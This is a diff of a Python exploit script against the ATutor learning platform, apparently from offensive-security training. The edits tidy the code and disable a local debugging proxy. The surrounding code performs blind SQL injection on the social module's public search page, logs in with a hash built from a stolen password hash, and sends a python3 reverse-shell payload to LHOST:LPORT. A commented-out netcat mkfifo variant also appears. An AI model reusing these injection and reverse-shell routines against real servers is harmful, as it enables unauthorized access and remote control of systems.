@@ -10,7 +10,7 @@ ascii_list = list(range(48,57)) + list(range(97, 123)) + list(range(32,48)) + li
 # Numbers, small letters, punctuation, big letters (from 32 to 127)
 
 def searchFriends_sqli(ip, inj_str):
-    target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str)
+    target = f"http://{ip}/ATutor/mods/_standard/social/index_public.php?q={inj_str}"
     r = requests.get(target)
     s = BeautifulSoup(r.text, 'lxml')
 
@@ -48,10 +48,6 @@ def login(ip, username, user_hash):
     token = "token"
     hashed = hashlib.sha1((user_hash + token).encode('utf-8'))
 
-    proxies = {
-        'http': 'http://127.0.0.1:8080'
-    }
-
     data = {
         "submit": "Login",
         "form_login": username,
@@ -68,12 +64,12 @@ def login(ip, username, user_hash):
 
     s.headers.update(headers)
 
-    proxies = {
-        'http': 'http://127.0.0.1:8080'
-    }
-    s.proxies.update(proxies)
+    # proxies = {
+    #     'http': 'http://127.0.0.1:8080'
+    # }
+    # s.proxies.update(proxies)
 
-    r = s.post(target, data=data,proxies=proxies)
+    r = s.post(target, data=data)
     res = r.text
 
     if re.search("Invalid login/password combination.",res):
@@ -125,7 +121,7 @@ def send_reverse_shell(ip, session):
 
     # payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
     payload = f"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
-    print(f"Reverse shell payload: payload")
+    print(f"Reverse shell payload: {payload}")
     send_command(ip, session, payload)
 
 def main():
